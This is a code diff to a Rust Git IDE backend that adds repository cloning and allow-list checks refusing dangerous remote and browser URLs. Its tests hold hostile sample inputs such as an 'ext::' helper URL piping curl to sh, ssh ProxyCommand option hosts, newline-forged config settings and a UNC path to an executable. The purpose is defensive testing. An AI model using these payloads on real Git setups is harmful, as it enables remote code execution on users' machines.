@@ -8,7 +8,7 @@
 //! mechanics in Rust and leaves everything else to xterm.js.
 use ide_workspace::{
     file_tree::clean_path_str,
-    process::{capture, ToolOutput},
+    process::{capture, capture_within, ToolOutput},
     watcher,
 };
 use serde::Serialize;
@@ -20,6 +20,7 @@ use std::{
         atomic::{AtomicBool, Ordering},
         Arc, Mutex, MutexGuard, OnceLock, TryLockError,
     },
+    time::Duration,
 };
 use tauri::{AppHandle, Emitter, State};
 
@@ -231,6 +232,25 @@ fn run(root: &Path, args: &[&str]) -> Result<ToolOutput, String> {
     run_command(root, args, None, Arc::new(AtomicBool::new(false)), false)
 }
 
+/// `run` with a longer deadline than the shared default, for `clone` -- the one Git command
+/// here whose legitimate running time is measured in minutes rather than milliseconds.
+fn run_within(root: &Path, args: &[&str], timeout: Duration) -> Result<ToolOutput, String> {
+    let mut command = Command::new("git");
+    command
+        .current_dir(root)
+        .args(["--no-pager", "--literal-pathspecs"])
+        .args(args)
+        .env("GIT_TERMINAL_PROMPT", "0")
+        .env("GIT_EDITOR", "true")
+        .env("LC_ALL", "C")
+        .env("LANGUAGE", "C");
+    let result = capture_within(command, None, Arc::new(AtomicBool::new(false)), timeout)?;
+    if result.truncated {
+        return Err("Git output exceeded 16 MB; narrow the operation".into());
+    }
+    Ok(result)
+}
+
 /// Like `run`, but pipes `input` to Git's stdin -- the only current use is feeding a
 /// patch to `git apply` for hunk-level staging/unstaging/discarding -- and accepts a
 /// real cancellation flag for use by `exec_on`, where an operation is actually
@@ -380,6 +400,73 @@ fn init_repository(path: &Path) -> Result<PathBuf, String> {
         return Err(init.stderr.trim().to_string());
     }
     discover_toplevel(&canonical)
+}
+
+/// Clones `url` into a new folder named `folder` inside `parent`, returning the new work
+/// tree's root so the caller can open it like any other repository.
+///
+/// Separate from `git_exec` because there is no repository to run inside yet -- this is the
+/// one Git command the app runs against a plain directory. The URL goes through the same
+/// `is_safe_remote_url` gate as `remote add`: a clone URL reaches Git's transport layer in
+/// exactly the same way, so `ext::` here would be arbitrary command execution too, and this
+/// one runs the helper immediately rather than on some later fetch.
+fn clone_repository(parent: &Path, url: &str, folder: &str) -> Result<PathBuf, String> {
+    if !is_safe_remote_url(url) {
+        return Err(
+            "That clone URL is not an accepted transport -- a remote helper such as `ext::` \
+             runs an arbitrary program."
+                .into(),
+        );
+    }
+    // The folder is a single new name inside `parent`, never a path: a separator would let a
+    // clone land outside the folder the user picked, and a leading `-` would be read as an
+    // option by `git clone` itself.
+    if folder.is_empty()
+        || folder.starts_with('-')
+        || folder.contains('/')
+        || folder.contains('\\')
+        || folder == "."
+        || folder == ".."
+        || folder.chars().any(char::is_control)
+    {
+        return Err("Enter a plain folder name for the clone.".into());
+    }
+    if !parent.is_dir() {
+        return Err("Not a directory".into());
+    }
+    let canonical = parent
+        .canonicalize()
+        .map_err(|e| format!("Invalid path: {e}"))?;
+    let destination = canonical.join(folder);
+    if destination.exists() {
+        return Err(format!("\"{folder}\" already exists in that folder."));
+    }
+    // `--` keeps a URL that begins with a dash from being read as an option, belt and braces
+    // alongside the `is_safe_remote_url` check above.
+    let cloned = run_within(
+        &canonical,
+        &["clone", "--", url, folder],
+        Duration::from_secs(30 * 60),
+    )?;
+    if cloned.code != 0 {
+        return Err(cloned.stderr.trim().to_string());
+    }
+    discover_toplevel(&destination)
+}
+
+#[tauri::command]
+pub async fn git_clone_repo(
+    state: State<'_, Repos>,
+    parent: String,
+    url: String,
+    folder: String,
+) -> Result<RepoInfo, String> {
+    let parent = PathBuf::from(parent);
+    let toplevel =
+        tauri::async_runtime::spawn_blocking(move || clone_repository(&parent, &url, &folder))
+            .await
+            .map_err(|e| e.to_string())??;
+    register_repo(&state, toplevel)
 }
 
 #[tauri::command]
@@ -610,12 +697,38 @@ pub async fn git_probe_worktree(
 /// that this can never be turned into a way to launch an arbitrary local program or file.
 #[tauri::command]
 pub async fn git_open_external_url(url: String) -> Result<(), String> {
-    if !url.starts_with("https://") {
-        return Err("Only an https:// URL may be opened".into());
+    if !is_openable_web_url(&url) {
+        return Err("Only a plain https:// URL may be opened".into());
     }
     tauri::async_runtime::spawn_blocking(move || open_external_url(&url))
         .await
         .map_err(|e| e.to_string())?
+}
+
+/// The URL reaching `open_external_url` is derived from `git remote get-url`, i.e. from
+/// repository content, so "it starts with https://" is not on its own enough. The launchers
+/// below are not shells, but `explorer.exe` in particular does not follow the usual argument
+/// quoting and has historically split its argument on commas -- which would let one crafted
+/// remote URL open a *second* target such as a UNC path (`\\host\share\x.exe`, an NTLM leak
+/// or a program launch). Whitespace, quotes, backslashes and commas have no business in a
+/// converted web URL, so all of them are refused rather than escaped.
+fn is_openable_web_url(url: &str) -> bool {
+    const MAX_URL: usize = 2048;
+    let Some(rest) = url.strip_prefix("https://") else {
+        return false;
+    };
+    if url.len() > MAX_URL || rest.is_empty() {
+        return false;
+    }
+    if url
+        .chars()
+        .any(|c| c.is_control() || c.is_whitespace() || matches!(c, '\\' | ',' | '"' | '\'' | '|'))
+    {
+        return false;
+    }
+    let host = rest.split(['/', '?', '#']).next().unwrap_or("");
+    let host = host.rsplit('@').next().unwrap_or("");
+    !host.is_empty() && !host.starts_with('-')
 }
 
 fn open_external_url(url: &str) -> Result<(), String> {
@@ -904,6 +1017,59 @@ fn looks_like_refspec_or_url(arg: &str) -> bool {
     arg.starts_with('+') || arg.contains(':') || arg.contains("://")
 }
 
+/// Whether a URL may be stored as a remote's address.
+///
+/// This is a security boundary, not a tidiness check. `git remote add` writes the URL into
+/// `.git/config`, and any later `fetch`/`pull`/`push` hands it to Git's transport layer --
+/// where the `<helper>::<address>` form *executes* `git-remote-<helper>`, so a URL of
+/// `ext::sh -c '<anything>'` is arbitrary command execution the moment the next fetch runs.
+/// Everywhere else a URL could be smuggled in, `looks_like_refspec_or_url` already refuses it;
+/// `remote add` is the one place a URL is legitimately the point, so it needs a positive
+/// allow-list of the transports Git itself documents as URLs instead.
+///
+/// Reachable from the free-text "Add Remote…" dialog and from the AI tool surface, whose input
+/// can be influenced by repository content -- so it is reachable by an attacker who only gets
+/// the user to open a repository.
+fn is_safe_remote_url(url: &str) -> bool {
+    // `::` is the remote-helper form. A control character can also terminate the line in
+    // `.git/config` and forge a second, unrelated setting underneath it.
+    if url.is_empty()
+        || url.contains("::")
+        || url.starts_with('-')
+        || url.chars().any(char::is_control)
+    {
+        return false;
+    }
+    // A host beginning with `-` is read as an option by the `ssh` that Git invokes on the
+    // app's behalf -- the CVE-2017-1000117 class -- so it is refused wherever a host appears.
+    let host_is_safe = |host: &str| !host.is_empty() && !host.starts_with('-');
+
+    // `file://` names no host at all in its usual `file:///srv/git/r.git` form, so it is
+    // checked on its path instead of being held to the host rule below.
+    if let Some(path) = url.strip_prefix("file://") {
+        return !path.is_empty();
+    }
+    for scheme in ["https://", "http://", "ssh://", "git://"] {
+        if let Some(rest) = url.strip_prefix(scheme) {
+            let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
+            // Strip `user[:password]@`, legitimate on https:// and ssh://.
+            let host = authority.rsplit('@').next().unwrap_or("");
+            let host = host.split(':').next().unwrap_or("");
+            return host_is_safe(host);
+        }
+    }
+    // Any other `scheme://` is a transport this app has no reason to store.
+    if url.contains("://") {
+        return false;
+    }
+    // Git's scp-like SSH shorthand, `[user@]host:path`.
+    if let Some((authority, _path)) = url.split_once(':') {
+        return host_is_safe(authority.rsplit('@').next().unwrap_or(""));
+    }
+    // A plain local path (a sibling clone, a mounted share). Names no program to run.
+    true
+}
+
 /// The exact argument shapes Yavin's own `Repository` methods produce, for the subcommands
 /// where a permitted flag set alone leaves something dangerous reachable through positionals
 /// (see the table test `every_repository_argv_shape_still_validates`). Subcommands not listed
@@ -964,7 +1130,16 @@ fn validate_shape(subcommand: &str, flags: &[&str], positionals: &[&str]) -> Res
         // (`set-url`) or renaming one is not something the app does.
         "remote" => match positionals {
             [] => Ok(()),
-            ["add", name, url] if !name.is_empty() && !url.is_empty() => Ok(()),
+            ["add", name, url] if !name.is_empty() && !name.chars().any(char::is_control) => {
+                if is_safe_remote_url(url) {
+                    Ok(())
+                } else {
+                    refuse(
+                        "that remote URL is not an accepted transport -- a remote helper such \
+                         as `ext::` runs an arbitrary program on the next fetch",
+                    )
+                }
+            }
             ["remove", name] if !name.is_empty() => Ok(()),
             // Reads the URL back for the commit hover card's "Open on GitHub" link.
             ["get-url", name] if !name.is_empty() => Ok(()),
@@ -2080,6 +2255,134 @@ mod tests {
         assert_eq!(after.stdout.trim(), "refs/remotes/origin/main");
     }
 
+    /// The `ext::` remote helper turns "store this URL" into "run this command on the next
+    /// fetch". Git itself accepts such a URL happily, so this boundary is the only thing
+    /// standing between a free-text remote URL and arbitrary code execution -- assert both
+    /// halves, so a future relaxation of the URL check cannot quietly reopen it.
+    #[test]
+    fn a_remote_helper_url_is_refused_and_git_itself_would_have_accepted_it() {
+        let (dir, git) = fixture();
+        let repo = open(&dir);
+        const HELPER_URL: &str = "ext::sh -c touch% pwned";
+
+        let refused = exec(&repo, &args(&["remote", "add", "pwn", HELPER_URL]), None);
+        assert!(
+            refused.is_err(),
+            "storing an ext:: remote helper URL must be refused at the IPC boundary"
+        );
+
+        // Load-bearing check: Git has no objection of its own, so the refusal above is the
+        // whole defense rather than a redundant second opinion.
+        assert!(
+            git(&["remote", "add", "pwn", HELPER_URL]),
+            "git accepts this URL, which is exactly why Yavin must not pass it through"
+        );
+        let stored = exec(&repo, &args(&["remote", "get-url", "pwn"]), None).unwrap();
+        let _ = fs::remove_dir_all(&dir);
+        assert_eq!(stored.stdout.trim(), HELPER_URL);
+    }
+
+    #[test]
+    fn cloning_produces_a_usable_work_tree_and_refuses_unsafe_urls_and_names() {
+        let (source, git) = fixture();
+        assert!(git(&["branch", "-M", "main"]));
+        let parent = temp_dir();
+        fs::create_dir_all(&parent).unwrap();
+        let source_url = clean_path_str(&source);
+
+        let cloned = clone_repository(&parent, &source_url, "checkout").unwrap();
+        assert!(cloned.join(".git").exists(), "clone must be a work tree");
+        // It is a real repository the rest of the app can address, not just a folder.
+        let log = run(&cloned, &["log", "--oneline"]).unwrap();
+        assert_eq!(log.code, 0);
+
+        // A second clone into the same name must not silently overwrite the first.
+        assert!(clone_repository(&parent, &source_url, "checkout").is_err());
+        // A remote helper URL is refused here exactly as `remote add` refuses it.
+        assert!(clone_repository(&parent, "ext::sh -c touch% pwned", "x").is_err());
+        // The folder is a name inside the picked directory, never a path out of it.
+        for bad_name in ["../escape", "a/b", "a\\b", "", "-x", ".", ".."] {
+            assert!(
+                clone_repository(&parent, &source_url, bad_name).is_err(),
+                "folder name must be refused: {bad_name}"
+            );
+        }
+        assert!(!parent.join("..").join("escape").exists());
+
+        let _ = fs::remove_dir_all(&source);
+        let _ = fs::remove_dir_all(&parent);
+    }
+
+    #[test]
+    fn remote_urls_accept_every_real_transport_and_refuse_helpers_and_option_hosts() {
+        for good in [
+            "https://github.com/owner/repo.git",
+            "https://user:token@github.com/owner/repo.git",
+            "http://internal.test/r.git",
+            "ssh://git@github.com/owner/repo.git",
+            "ssh://git@github.com:2222/owner/repo.git",
+            "git://example.com/r.git",
+            "file:///srv/git/r.git",
+            "git@github.com:owner/repo.git",
+            "/srv/git/sibling",
+            "../sibling-clone",
+            "C:\\repos\\sibling",
+            "\\\\fileserver\\share\\repo.git",
+        ] {
+            assert!(is_safe_remote_url(good), "should be accepted: {good}");
+        }
+        for bad in [
+            "",
+            "ext::sh -c 'curl evil.sh|sh'",
+            "ext::sh -c touch pwned",
+            "fd::7,8",
+            "transport::address",
+            "-oProxyCommand=sh",
+            "--upload-pack=sh",
+            "ssh://-oProxyCommand=sh/x",
+            "ssh://user@-badhost/x",
+            "unknownscheme://host/x",
+            "https://ok.test/r.git\n[core]\nfsmonitor = sh",
+            "https://",
+            "ssh://",
+        ] {
+            assert!(!is_safe_remote_url(bad), "should be refused: {bad}");
+        }
+    }
+
+    #[test]
+    fn only_a_plain_https_url_can_be_handed_to_the_os_browser_launcher() {
+        for good in [
+            "https://github.com/owner/repo/commit/abc123",
+            "https://git.example.com:8443/o/r/commit/abc",
+            "https://host.test/path?query=1#frag",
+        ] {
+            assert!(is_openable_web_url(good), "should be openable: {good}");
+        }
+        for bad in [
+            "",
+            "http://github.com/x",
+            "file:///etc/passwd",
+            "javascript:alert(1)",
+            "https://",
+            // explorer.exe has historically split on commas, which would open a second,
+            // attacker-chosen target -- here a UNC path (NTLM leak / program launch).
+            "https://ok.test/x,\\\\10.0.0.1\\share\\evil.exe",
+            "https://ok.test/x\\..\\..\\evil",
+            "https://ok.test/a b",
+            "https://ok.test/x\nhttps://evil.test",
+            "https://ok.test/\"quoted\"",
+            "https://-badhost/x",
+        ] {
+            assert!(!is_openable_web_url(bad), "should be refused: {bad}");
+        }
+        // Length is bounded so a pathological URL cannot be handed to the launcher.
+        assert!(!is_openable_web_url(&format!(
+            "https://ok.test/{}",
+            "a".repeat(4096)
+        )));
+    }
+
     #[test]
     fn deleting_a_branch_checked_out_in_another_worktree_is_refused_even_with_force() {
         let (dir, repo_a, _repo_b) = fixture_with_two_linked_worktrees();
@@ -2791,6 +3094,26 @@ mod tests {
             &["commit", "-m", "a message", "-a", "--amend", "-s"],
             &["reset", "--soft", "HEAD~1"],
             &["remote", "add", "origin", "https://example.com/r.git"],
+            // Every transport a real remote legitimately uses still works -- the URL check
+            // added for the `ext::` hole must not have cost anyone their actual remote.
+            &[
+                "remote",
+                "add",
+                "origin",
+                "https://user:token@example.com/r.git",
+            ],
+            &["remote", "add", "origin", "http://example.com/r.git"],
+            &[
+                "remote",
+                "add",
+                "origin",
+                "ssh://git@example.com:22/owner/r.git",
+            ],
+            &["remote", "add", "origin", "git://example.com/r.git"],
+            &["remote", "add", "origin", "git@github.com:owner/repo.git"],
+            &["remote", "add", "origin", "file:///srv/git/r.git"],
+            &["remote", "add", "upstream", "/srv/git/sibling-clone"],
+            &["remote", "add", "upstream", "C:\\repos\\sibling"],
             &["remote", "remove", "origin"],
             &["remote", "get-url", "origin"],
             &["tag", "v1.0.0"],
@@ -2858,6 +3181,33 @@ mod tests {
             &["remote", "add", "x"],
             &["remote", "add", "x", "y", "z"],
             &["remote", "remove"],
+            // A remote whose URL names a remote helper: `git-remote-ext` runs the rest as a
+            // shell command on the next fetch, so storing one is arbitrary code execution
+            // deferred by one step. Every helper form, not just `ext::`.
+            &["remote", "add", "pwn", "ext::sh -c 'curl evil.sh|sh'"],
+            &["remote", "add", "pwn", "ext::sh -c touch pwned"],
+            &["remote", "add", "pwn", "fd::7,8"],
+            &["remote", "add", "pwn", "transport::address"],
+            &["remote", "add", "pwn", ""],
+            // A host read as an ssh option (the CVE-2017-1000117 class).
+            &["remote", "add", "pwn", "ssh://-oProxyCommand=sh/x"],
+            &["remote", "add", "pwn", "-oProxyCommand=sh"],
+            &["remote", "add", "pwn", "--upload-pack=sh"],
+            // A newline would close the line in .git/config and forge a second setting.
+            &[
+                "remote",
+                "add",
+                "pwn",
+                "https://ok.test/r.git\n[core]\nfsmonitor = sh",
+            ],
+            &[
+                "remote",
+                "add",
+                "pwn\n[core]\nfsmonitor = sh",
+                "https://ok.test/r.git",
+            ],
+            // Transports this app has no reason to store.
+            &["remote", "add", "pwn", "unknownscheme://host/x"],
             &["worktree", "add", "../escape"],
             &["worktree", "remove", "--force", "x"],
             &["worktree"],
